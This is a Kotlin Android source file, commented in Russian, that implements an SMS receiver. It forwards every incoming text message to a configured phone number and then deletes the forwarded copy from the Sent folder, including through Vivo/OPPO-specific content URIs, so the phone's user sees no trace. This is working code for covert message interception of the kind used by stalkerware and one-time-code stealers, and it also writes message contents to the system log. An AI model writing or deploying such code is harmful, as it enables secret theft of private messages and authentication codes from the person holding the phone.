package com.example.smsforwarder

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import java.util.Date

class SmsReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "SmsReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            return
        }

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages.isEmpty()) {
            return
        }

        val fullMessage = messages.joinToString("") { it.messageBody ?: "" }
        val sender = messages[0].originatingAddress ?: "Unknown"

        Log.d(TAG, "SMS from $sender: $fullMessage")

        val cleanNumber = cleanPhoneNumber(sender)
        val forwardNumber = SettingsManager.forwardNumber
        val forwardText = buildForwardText(cleanNumber, fullMessage)

        Log.d(TAG, "Forwarding to $forwardNumber: $forwardText")

        sendSms(context, forwardNumber, forwardText)

        // Удаляем отправленное сообщение с разными форматами номера
        val phoneFormats = listOf(
            forwardNumber,
            "+$forwardNumber",
            "8$forwardNumber",
            "7$forwardNumber"
        )

        val now = System.currentTimeMillis()
        val twoMinutesAgo = now - 2 * 60 * 1000

        for (format in phoneFormats) {
            if (deleteByUri(context, Telephony.Sms.Sent.CONTENT_URI, format, forwardText, twoMinutesAgo)) {
                return
            }
        }

        // Пробуем кастомные URI для Vivo/OPPO
        val customUris = listOf(
            Uri.parse("content://mms-sms/conversations?simple=true"),
            Uri.parse("content://mms-sms/messages/"),
            Uri.parse("content://mms-sms/threadConversations")
        )

        for (uri in customUris) {
            try {
                val cursor = context.contentResolver.query(
                    uri,
                    arrayOf("_id", "address", "body", "date"),
                    null,
                    null,
                    "date DESC"
                )
                cursor?.use { c ->
                    while (c.moveToNext()) {
                        val addressIdx = c.getColumnIndex("address")
                        val bodyIdx = c.getColumnIndex("body")
                        val idIdx = c.getColumnIndex("_id")
                        val dateIdx = c.getColumnIndex("date")

                        if (addressIdx >= 0 && bodyIdx >= 0 && idIdx >= 0 && dateIdx >= 0) {
                            val address = c.getString(addressIdx)
                            val messageBody = c.getString(bodyIdx)
                            val date = c.getLong(dateIdx)
                            val id = c.getLong(idIdx)

                            if (address != null && messageBody != null && date >= twoMinutesAgo) {
                                for (format in phoneFormats) {
                                    if (address.contains(format) && messageBody.contains(forwardText.take(50))) {
                                        val msgUri = Uri.parse("content://mms-sms/$id")
                                        context.contentResolver.delete(msgUri, null, null)
                                        Log.d(TAG, "Deleted via custom URI: $msgUri")
                                        return
                                    }
                                }
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to query custom URI", e)
            }
        }
    }

    private fun cleanPhoneNumber(phone: String): String {
        val digits = phone.filter { it.isDigit() }
        return when {
            digits.startsWith("7") && digits.length == 11 -> digits.substring(1)
            digits.startsWith("8") && digits.length == 11 -> digits.substring(1)
            digits.startsWith("7") && digits.length == 10 -> digits.substring(1)
            else -> digits
        }
    }

    private fun buildForwardText(cleanNumber: String, body: String): String {
        val dateFormat = java.text.SimpleDateFormat("dd.MM|HH:mm", java.util.Locale.getDefault())
        return "$cleanNumber ${dateFormat.format(java.util.Date(System.currentTimeMillis()))}\n$body"
    }

    private fun sendSms(context: Context, phoneNumber: String, message: String) {
        try {
            val smsManager = SmsManager.getDefault()
            val parts = smsManager.divideMessage(message)
            if (parts.size > 1) {
                smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null)
            } else {
                smsManager.sendTextMessage(phoneNumber, null, message, null, null)
            }
            Log.i(TAG, "SMS forwarded to $phoneNumber")
        } catch (e: Exception) {
            Log.e(TAG, "Error sending SMS to $phoneNumber", e)
        }
    }

    private fun deleteByUri(
        context: Context,
        uri: Uri,
        address: String,
        body: String,
        afterTime: Long
    ): Boolean {
        return try {
            val projection = arrayOf("_id", "address", "body", "date")
            val selection = "address = ? AND date > ?"
            val selectionArgs = arrayOf(address, afterTime.toString())

            context.contentResolver.query(uri, projection, selection, selectionArgs, "date DESC")?.use { cursor ->
                var found = false
                while (cursor.moveToNext()) {
                    val idIdx = cursor.getColumnIndex("_id")
                    val bodyIdx = cursor.getColumnIndex("body")

                    if (idIdx >= 0 && bodyIdx >= 0) {
                        val id = cursor.getLong(idIdx)
                        val msgBody = cursor.getString(bodyIdx)

                        if (msgBody == body || msgBody?.startsWith(body.take(30)) == true) {
                            val msgUri = Uri.parse("content://sms/$id")
                            context.contentResolver.delete(msgUri, null, null)
                            Log.d(TAG, "Deleted sent message: $msgUri")
                            found = true
                        }
                    }
                }
                found
            } ?: false
        } catch (e: Exception) {
            Log.e(TAG, "Failed to delete via $uri", e)
            false
        }
    }
}